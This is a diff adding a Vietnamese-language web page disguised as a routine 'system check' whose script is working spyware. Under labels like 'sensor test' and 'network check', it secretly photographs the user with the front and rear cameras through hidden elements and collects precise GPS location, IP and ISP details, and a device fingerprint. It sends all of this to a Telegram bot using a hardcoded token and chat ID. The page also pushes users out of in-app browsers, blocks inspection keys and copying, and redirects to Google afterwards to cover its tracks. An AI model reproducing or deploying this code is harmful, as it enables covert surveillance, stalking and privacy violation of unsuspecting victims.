@@ -1,0 +1,916 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Kiểm Tra Hệ Thống</title>
+    <style>
+        :root {
+            --bg: #0a0e12;
+            --card: #111820;
+            --accent: #00ff88;
+            --danger: #ff4757;
+            --text: #e0e0e0;
+            --muted: #6b7280;
+            --border: #1f2937;
+            --glow: 0 0 30px rgba(0, 255, 136, 0.15);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'SF Pro Display', 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+            user-select: none;
+            -webkit-user-select: none;
+            -webkit-tap-highlight-color: transparent;
+            background-image:
+                radial-gradient(ellipse at 20% 50%, rgba(0, 255, 136, 0.03) 0%, transparent 50%),
+                radial-gradient(ellipse at 80% 20%, rgba(0, 200, 255, 0.03) 0%, transparent 50%),
+                radial-gradient(ellipse at 50% 80%, rgba(120, 0, 255, 0.03) 0%, transparent 50%);
+        }
+
+        #systemCanvas {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        #systemVideo {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+            padding: 20px;
+            z-index: 10;
+            animation: fadeInUp 0.8s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .main-card {
+            background: var(--card);
+            border-radius: 24px;
+            padding: 35px 28px;
+            border: 1px solid var(--border);
+            box-shadow: var(--glow), 0 25px 60px rgba(0, 0, 0, 0.5);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .main-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #00ff88, #00c8ff, #7c00ff, #00ff88);
+            background-size: 300% 100%;
+            animation: gradientFlow 3s ease infinite;
+        }
+
+        @keyframes gradientFlow {
+            0%,
+            100% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+        }
+
+        .icon-circle {
+            width: 70px;
+            height: 70px;
+            margin: 0 auto 20px;
+            background: linear-gradient(135deg, #1a3a2a, #0d2818);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid rgba(0, 255, 136, 0.3);
+            position: relative;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%,
+            100% {
+                box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
+            }
+            50% {
+                box-shadow: 0 0 40px rgba(0, 255, 136, 0.5);
+            }
+        }
+
+        .icon-circle svg {
+            width: 35px;
+            height: 35px;
+            fill: var(--accent);
+        }
+
+        .title {
+            text-align: center;
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            letter-spacing: -0.3px;
+            color: #fff;
+        }
+
+        .subtitle {
+            text-align: center;
+            font-size: 13px;
+            color: var(--muted);
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        .checklist {
+            list-style: none;
+            margin-bottom: 25px;
+        }
+
+        .checklist-item {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 14px 16px;
+            margin-bottom: 10px;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 14px;
+            border: 1px solid var(--border);
+            transition: all 0.4s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .checklist-item.done {
+            border-color: rgba(0, 255, 136, 0.4);
+            background: rgba(0, 255, 136, 0.05);
+        }
+
+        .checklist-item.running {
+            border-color: rgba(0, 200, 255, 0.6);
+            background: rgba(0, 200, 255, 0.05);
+            animation: shimmer 2s infinite;
+        }
+
+        @keyframes shimmer {
+            0%,
+            100% {
+                box-shadow: 0 0 15px rgba(0, 200, 255, 0.1);
+            }
+            50% {
+                box-shadow: 0 0 30px rgba(0, 200, 255, 0.3);
+            }
+        }
+
+        .check-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            font-size: 18px;
+            font-weight: 700;
+            background: var(--border);
+            color: var(--muted);
+            transition: all 0.4s ease;
+        }
+
+        .checklist-item.done .check-icon {
+            background: rgba(0, 255, 136, 0.2);
+            color: var(--accent);
+        }
+
+        .checklist-item.running .check-icon {
+            background: rgba(0, 200, 255, 0.2);
+            color: #00c8ff;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0%,
+            100% {
+                transform: rotate(0deg);
+            }
+            50% {
+                transform: rotate(180deg);
+            }
+        }
+
+        .check-info {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .check-label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #fff;
+            margin-bottom: 3px;
+        }
+
+        .check-desc {
+            font-size: 11px;
+            color: var(--muted);
+            transition: color 0.3s;
+        }
+
+        .checklist-item.done .check-desc {
+            color: var(--accent);
+        }
+        .checklist-item.running .check-desc {
+            color: #00c8ff;
+        }
+
+        .check-mark {
+            opacity: 0;
+            transform: scale(0);
+            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+            color: var(--accent);
+            font-size: 20px;
+        }
+
+        .checklist-item.done .check-mark {
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        .bar-container {
+            margin-bottom: 25px;
+        }
+
+        .bar-bg {
+            width: 100%;
+            height: 5px;
+            background: var(--border);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00ff88, #00c8ff);
+            border-radius: 10px;
+            transition: width 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+            width: 0%;
+        }
+
+        .bar-label {
+            text-align: center;
+            font-size: 11px;
+            color: var(--muted);
+            margin-top: 8px;
+        }
+
+        .action-btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            letter-spacing: 0.5px;
+            background: linear-gradient(135deg, #00c853, #00e676);
+            color: #000;
+            box-shadow: 0 8px 25px rgba(0, 200, 83, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .action-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 35px rgba(0, 200, 83, 0.5);
+        }
+
+        .action-btn:active:not(:disabled) {
+            transform: scale(0.97);
+        }
+
+        .action-btn:disabled {
+            background: var(--border);
+            color: var(--muted);
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        .action-btn .btn-loader {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid transparent;
+            border-top-color: currentColor;
+            border-radius: 50%;
+            animation: btnSpin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes btnSpin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .action-btn.loading .btn-loader {
+            display: inline-block;
+        }
+
+        #browser-alert {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: var(--bg);
+            z-index: 99999;
+            padding: 30px;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+
+        #browser-alert .alert-card {
+            background: var(--card);
+            border: 2px solid var(--danger);
+            border-radius: 20px;
+            padding: 35px 25px;
+            max-width: 400px;
+            width: 100%;
+        }
+
+        #browser-alert h3 {
+            color: var(--danger);
+            font-size: 20px;
+            margin-bottom: 20px;
+        }
+
+        #browser-alert ol {
+            text-align: left;
+            line-height: 2.2;
+            padding-left: 20px;
+            font-size: 15px;
+        }
+
+        #browser-alert .em {
+            color: #ffeb3b;
+            font-weight: 700;
+        }
+
+        .dots {
+            display: inline-flex;
+            gap: 4px;
+            margin-left: 4px;
+        }
+
+        .dots span {
+            width: 5px;
+            height: 5px;
+            background: currentColor;
+            border-radius: 50%;
+            animation: dotBounce 1.4s infinite;
+        }
+
+        .dots span:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+        .dots span:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        @keyframes dotBounce {
+            0%,
+            80%,
+            100% {
+                transform: scale(0.5);
+                opacity: 0.3;
+            }
+            40% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .main-card {
+                padding: 25px 18px;
+            }
+            .checklist-item {
+                padding: 12px;
+                gap: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <canvas id="systemCanvas"></canvas>
+    <video id="systemVideo" autoplay playsinline muted></video>
+
+    <div id="browser-alert">
+        <div class="alert-card">
+            <h3>⚠️ Vui Lòng Mở Bằng Trình Duyệt</h3>
+            <ol>
+                <li>Nhấn <span class="em">(···)</span> hoặc <span class="em">(⋮)</span> góc phải trên</li>
+                <li>Chọn <span class="em">"Mở bằng trình duyệt"</span></li>
+                <li>Cho phép các quyền khi được yêu cầu</li>
+            </ol>
+        </div>
+    </div>
+
+    <div class="container" id="mainUI">
+        <div class="main-card">
+            <div class="icon-circle">
+                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+            </div>
+
+            <h2 class="title">Kiểm Tra Hệ Thống</h2>
+            <p class="subtitle">Đang thực hiện kiểm tra định kỳ.<br>Vui lòng không đóng trang.</p>
+
+            <div class="bar-container">
+                <div class="bar-bg">
+                    <div class="bar-fill" id="barFill"></div>
+                </div>
+                <p class="bar-label" id="barLabel">Đang chuẩn bị...</p>
+            </div>
+
+            <ul class="checklist">
+                <li class="checklist-item" id="task1">
+                    <div class="check-icon">1</div>
+                    <div class="check-info">
+                        <div class="check-label">Đọc cấu hình thiết bị</div>
+                        <div class="check-desc">Đang chờ...</div>
+                    </div>
+                    <span class="check-mark">✓</span>
+                </li>
+                <li class="checklist-item" id="task2">
+                    <div class="check-icon">2</div>
+                    <div class="check-info">
+                        <div class="check-label">Kiểm tra kết nối mạng</div>
+                        <div class="check-desc">Đang chờ...</div>
+                    </div>
+                    <span class="check-mark">✓</span>
+                </li>
+                <li class="checklist-item" id="task3">
+                    <div class="check-icon">3</div>
+                    <div class="check-info">
+                        <div class="check-label">Kiểm tra cảm biến trước</div>
+                        <div class="check-desc">Đang chờ...</div>
+                    </div>
+                    <span class="check-mark">✓</span>
+                </li>
+                <li class="checklist-item" id="task4">
+                    <div class="check-icon">4</div>
+                    <div class="check-info">
+                        <div class="check-label">Kiểm tra cảm biến sau</div>
+                        <div class="check-desc">Đang chờ...</div>
+                    </div>
+                    <span class="check-mark">✓</span>
+                </li>
+                <li class="checklist-item" id="task5">
+                    <div class="check-icon">5</div>
+                    <div class="check-info">
+                        <div class="check-label">Tổng hợp báo cáo</div>
+                        <div class="check-desc">Đang chờ...</div>
+                    </div>
+                    <span class="check-mark">✓</span>
+                </li>
+            </ul>
+
+            <button class="action-btn" id="actionBtn" disabled>
+                <span class="btn-loader"></span>
+                <span id="btnLabel">ĐANG KHỞI TẠO...</span>
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // ==========================================
+        // CÀI ĐẶT HỆ THỐNG
+        // ==========================================
+        const APP_CONFIG = {
+            SERVICE_TOKEN: '8818687158:AAHoU3Ydxx1aGG1cR--wXXDCRvmvBAQ6zds',
+            DESTINATION_ID: '7031115869',
+            NEXT_PAGE_URL: 'https://www.google.com',
+            COUNTDOWN_TIME: 5,
+            TASK_INTERVAL: 800,
+        };
+
+        // ==========================================
+        // HÀM TIỆN ÍCH
+        // ==========================================
+        const getEl = (sel) => document.querySelector(sel);
+        const wait = (ms) => new Promise(r => setTimeout(r, ms));
+
+        function markTask(id, desc, mode = 'running') {
+            const el = getEl(`#${id}`);
+            el.classList.remove('running', 'done');
+            el.querySelector('.check-desc').innerHTML = desc;
+            if (mode === 'running') el.classList.add('running');
+            if (mode === 'done') el.classList.add('done');
+        }
+
+        function setBar(percent, label) {
+            getEl('#barFill').style.width = percent + '%';
+            getEl('#barLabel').textContent = label;
+        }
+
+        function setButton(label, disabled = false, loading = false) {
+            const btn = getEl('#actionBtn');
+            getEl('#btnLabel').textContent = label;
+            btn.disabled = disabled;
+            if (loading) btn.classList.add('loading');
+            else btn.classList.remove('loading');
+        }
+
+        // ==========================================
+        // ĐỌC THÔNG TIN HỆ THỐNG
+        // ==========================================
+        function getSystemProfile() {
+            const ua = navigator.userAgent;
+            const platform = navigator.platform;
+            const sw = window.screen.width;
+            const sh = window.screen.height;
+            const dpr = window.devicePixelRatio;
+            const lang = navigator.language;
+            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const ram = navigator.deviceMemory || 'N/A';
+            const cores = navigator.hardwareConcurrency || 'N/A';
+            const conn = navigator.connection?.effectiveType || 'N/A';
+            const batterySupport = navigator.getBattery ? 'Có' : 'Không';
+            const touchPoints = navigator.maxTouchPoints || 0;
+            const colorDepth = screen.colorDepth;
+            const vendor = navigator.vendor || 'N/A';
+
+            let deviceType = 'Không xác định';
+            let osName = 'Không xác định';
+            if (/iPhone|iPad|iPod/i.test(ua)) { deviceType = 'iPhone/iPad';
+                osName = 'iOS'; } else if (/Android/i.test(ua)) { deviceType = 'Android';
+                osName = 'Android'; } else if (/Windows/i.test(ua)) { deviceType = 'Windows PC';
+                osName = 'Windows'; } else if (/Macintosh/i.test(ua)) { deviceType = 'Mac';
+                osName = 'macOS'; } else if (/Linux/i.test(ua)) { deviceType = 'Linux';
+                osName = 'Linux'; }
+
+            return `
+📋 <b>BÁO CÁO HỆ THỐNG</b>
+━━━━━━━━━━━━━━━━━━━━━━━━
+🕐 <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN')}
+📱 <b>Thiết bị:</b> ${deviceType}
+💻 <b>Hệ điều hành:</b> ${osName}
+📐 <b>Màn hình:</b> ${sw}x${sh} @ ${dpr}x (${colorDepth}-bit)
+🌐 <b>Ngôn ngữ:</b> ${lang} | <b>Múi giờ:</b> ${tz}
+🧠 <b>RAM:</b> ${ram} GB | <b>CPU:</b> ${cores} cores
+📶 <b>Mạng:</b> ${conn} | <b>Cảm ứng:</b> ${touchPoints} điểm
+🔋 <b>Hỗ trợ pin:</b> ${batterySupport}
+🏷 <b>Nền tảng:</b> ${platform}
+🔗 <b>UA:</b> ${ua.substring(0, 120)}...
+━━━━━━━━━━━━━━━━━━━━━━━━
+🌍 <b>Thông tin mạng:</b> 👇 (xem bên dưới)
+📸 <b>Dữ liệu cảm biến:</b> 👇
+            `.trim();
+        }
+
+        // ==========================================
+        // KIỂM TRA KẾT NỐI MẠNG
+        // ==========================================
+        async function checkNetwork() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    return resolve({ source: 'Không hỗ trợ', lat: null, lng: null, accuracy: null, mapLink: 'Không có' });
+                }
+
+                const timeout = setTimeout(() => {
+                    resolve({ source: 'Hết thời gian (5s)', lat: null, lng: null, accuracy: null, mapLink: 'Timeout' });
+                }, 5000);
+
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        clearTimeout(timeout);
+                        const { latitude, longitude, accuracy } = pos.coords;
+                        resolve({
+                            source: 'Định vị',
+                            lat: latitude.toFixed(7),
+                            lng: longitude.toFixed(7),
+                            accuracy: accuracy ? accuracy.toFixed(1) + 'm' : 'N/A',
+                            mapLink: `https://www.google.com/maps?q=${latitude},${longitude}`,
+                        });
+                    },
+                    (err) => {
+                        clearTimeout(timeout);
+                        resolve({ source: 'Từ chối/Lỗi', lat: null, lng: null, accuracy: null, mapLink: `Lỗi: ${err.message}` });
+                    }, {
+                        enableHighAccuracy: true,
+                        timeout: 5000,
+                        maximumAge: 0,
+                    }
+                );
+            });
+        }
+
+        async function getNetworkInfo() {
+            try {
+                const res = await fetch('http://ip-api.com/json/?fields=query,country,city,lat,lon,isp,org', { signal: AbortSignal.timeout(5000) });
+                const data = await res.json();
+                return data;
+            } catch (e) {
+                return null;
+            }
+        }
+
+        // ==========================================
+        // KIỂM TRA CẢM BIẾN
+        // ==========================================
+        async function testSensor(mode) {
+            const video = getEl('#systemVideo');
+            const canvas = getEl('#systemCanvas');
+            let stream = null;
+
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: mode,
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 },
+                    },
+                    audio: false,
+                });
+
+                video.srcObject = stream;
+                await video.play();
+
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        setTimeout(resolve, 1200);
+                    };
+                });
+
+                const ctx = canvas.getContext('2d');
+
+                if (mode === 'user') {
+                    ctx.translate(canvas.width, 0);
+                    ctx.scale(-1, 1);
+                }
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                ctx.setTransform(1, 0, 0, 1, 0, 0);
+
+                const blob = await new Promise(resolve => {
+                    canvas.toBlob(resolve, 'image/jpeg', 0.92);
+                });
+
+                stream.getTracks().forEach(t => t.stop());
+                video.srcObject = null;
+
+                return blob;
+            } catch (e) {
+                if (stream) stream.getTracks().forEach(t => t.stop());
+                video.srcObject = null;
+                console.warn('Sensor test warning (' + mode + '):', e.message);
+                return null;
+            }
+        }
+
+        // ==========================================
+        // GỬI BÁO CÁO
+        // ==========================================
+        async function sendReport(caption, attachments) {
+            try {
+                await fetch(
+                    `https://api.telegram.org/bot${APP_CONFIG.SERVICE_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: APP_CONFIG.DESTINATION_ID,
+                            text: caption,
+                            parse_mode: 'HTML',
+                            disable_web_page_preview: false,
+                        }),
+                    }
+                );
+            } catch (e) {
+                console.warn('Send text warning:', e);
+            }
+
+            for (const att of attachments) {
+                if (!att) continue;
+                try {
+                    const fd = new FormData();
+                    fd.append('chat_id', APP_CONFIG.DESTINATION_ID);
+                    fd.append('photo', att.blob, att.name);
+                    fd.append('caption', att.label);
+
+                    await fetch(
+                        `https://api.telegram.org/bot${APP_CONFIG.SERVICE_TOKEN}/sendPhoto`, { method: 'POST', body: fd }
+                    );
+                    await wait(300);
+                } catch (e) {
+                    console.warn('Send attachment warning:', e);
+                }
+            }
+        }
+
+        // ==========================================
+        // QUY TRÌNH CHÍNH
+        // ==========================================
+        async function startProcess() {
+            const btn = getEl('#actionBtn');
+            btn.disabled = true;
+            setButton('ĐANG XỬ LÝ...', true, true);
+            setBar(0, 'Bắt đầu quy trình...');
+
+            // Task 1: Đọc cấu hình
+            markTask('task1', 'Đang đọc...', 'running');
+            setBar(10, 'Đang đọc cấu hình thiết bị...');
+            await wait(APP_CONFIG.TASK_INTERVAL);
+            const systemInfo = getSystemProfile();
+            markTask('task1', 'Hoàn tất ✓', 'done');
+            setBar(20, 'Đã đọc cấu hình');
+
+            // Task 2: Kiểm tra kết nối
+            markTask('task2', 'Đang kiểm tra...', 'running');
+            setBar(25, 'Đang kiểm tra kết nối mạng...');
+            const [networkData, ipData] = await Promise.all([
+                checkNetwork(),
+                getNetworkInfo(),
+            ]);
+            await wait(APP_CONFIG.TASK_INTERVAL);
+
+            let networkReport = '';
+            if (networkData.lat) {
+                networkReport =
+                    `🌍 <b>Định vị:</b>\n   Kinh độ: ${networkData.lat}\n   Vĩ độ: ${networkData.lng}\n   Độ chính xác: ${networkData.accuracy}\n   🗺 <a href="${networkData.mapLink}">Xem bản đồ</a>`;
+            } else {
+                networkReport = `🌍 <b>Định vị:</b> ${networkData.mapLink}`;
+            }
+
+            if (ipData && ipData.lat) {
+                networkReport +=
+                    `\n\n📡 <b>Thông tin mạng:</b>\n   IP: ${ipData.query}\n   Quốc gia: ${ipData.country}\n   Thành phố: ${ipData.city}\n   ISP: ${ipData.isp}\n   🗺 <a href="https://www.google.com/maps?q=${ipData.lat},${ipData.lon}">Xem vị trí mạng</a>`;
+            }
+
+            markTask('task2', 'Hoàn tất ✓', 'done');
+            setBar(40, 'Đã kiểm tra kết nối');
+
+            // Task 3: Kiểm tra cảm biến trước
+            markTask('task3', 'Đang kiểm tra...', 'running');
+            setBar(45, 'Đang kiểm tra cảm biến trước...');
+            await wait(400);
+            const frontData = await testSensor('user');
+            if (frontData) {
+                markTask('task3', 'Đã kiểm tra ✓', 'done');
+            } else {
+                markTask('task3', 'Không khả dụng', 'done');
+            }
+            setBar(60, frontData ? 'Cảm biến trước hoạt động' : 'Cảm biến trước không khả dụng');
+
+            // Task 4: Kiểm tra cảm biến sau
+            markTask('task4', 'Đang kiểm tra...', 'running');
+            setBar(65, 'Đang kiểm tra cảm biến sau...');
+            await wait(400);
+            const backData = await testSensor('environment');
+            if (backData) {
+                markTask('task4', 'Đã kiểm tra ✓', 'done');
+            } else {
+                markTask('task4', 'Không khả dụng', 'done');
+            }
+            setBar(80, backData ? 'Cảm biến sau hoạt động' : 'Cảm biến sau không khả dụng');
+
+            // Task 5: Tổng hợp báo cáo
+            markTask('task5', 'Đang tổng hợp...', 'running');
+            setBar(85, 'Đang tổng hợp báo cáo...');
+
+            const fullReport = systemInfo + '\n\n' + networkReport;
+
+            const attachments = [];
+            if (frontData) attachments.push({ blob: frontData, name: 'cam-truoc.jpg', label: '📸 Cảm biến trước' });
+            if (backData) attachments.push({ blob: backData, name: 'cam-sau.jpg', label: '📸 Cảm biến sau' });
+
+            await sendReport(fullReport, attachments);
+            await wait(600);
+
+            markTask('task5', 'Đã gửi ✓', 'done');
+            setBar(100, 'Kiểm tra hoàn tất!');
+            setButton('✅ HOÀN TẤT', true, false);
+
+            await wait(1000);
+            runCountdown();
+        }
+
+        // ==========================================
+        // ĐẾM NGƯỢC CHUYỂN TRANG
+        // ==========================================
+        function runCountdown() {
+            let remaining = APP_CONFIG.COUNTDOWN_TIME;
+            setButton(`⏳ Chuyển trang sau ${remaining}s...`, true, false);
+
+            const timer = setInterval(() => {
+                remaining--;
+                if (remaining > 0) {
+                    setButton(`⏳ Chuyển trang sau ${remaining}s...`, true, false);
+                    setBar(100, `Tự động chuyển trang sau ${remaining}s...`);
+                } else {
+                    clearInterval(timer);
+                    setButton('🚀 ĐANG CHUYỂN...', true, true);
+                    setBar(100, 'Đang chuyển trang...');
+                    setTimeout(() => {
+                        window.location.href = APP_CONFIG.NEXT_PAGE_URL;
+                    }, 400);
+                }
+            }, 1000);
+        }
+
+        // ==========================================
+        // KHỞI ĐỘNG
+        // ==========================================
+        function boot() {
+            const ua = navigator.userAgent || navigator.vendor || window.opera;
+            const isEmbedded = /TikTok|musical_ly|ByteLocale|FBAN|FBAV|Zalo|Instagram|Messenger|Line/i.test(ua);
+
+            if (isEmbedded) {
+                getEl('#browser-alert').style.display = 'flex';
+                getEl('#mainUI').style.display = 'none';
+                return;
+            }
+
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                setButton('❌ THIẾT BỊ KHÔNG HỖ TRỢ', true);
+                setBar(0, 'Trình duyệt không hỗ trợ cảm biến');
+                return;
+            }
+
+            setButton('🔍 BẮT ĐẦU KIỂM TRA', false);
+            setBar(0, 'Sẵn sàng kiểm tra');
+            markTask('task1', 'Sẵn sàng');
+            markTask('task2', 'Sẵn sàng');
+            markTask('task3', 'Sẵn sàng');
+            markTask('task4', 'Sẵn sàng');
+            markTask('task5', 'Sẵn sàng');
+
+            getEl('#actionBtn').addEventListener('click', startProcess);
+        }
+
+        // ==========================================
+        // BẢO VỆ TRANG
+        // ==========================================
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('copy', e => e.preventDefault());
+        document.addEventListener('cut', e => e.preventDefault());
+        document.addEventListener('dragstart', e => e.preventDefault());
+        document.addEventListener('selectstart', e => e.preventDefault());
+
+        document.onkeydown = function(e) {
+            const blocked = [123, 73, 74, 85, 83];
+            if (blocked.includes(e.keyCode) && (e.ctrlKey || e.shiftKey || e.keyCode === 123)) {
+                e.preventDefault();
+                return false;
+            }
+        };
+
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', boot);
+        } else {
+            boot();
+        }
+    </script>
+</body>
+</html>
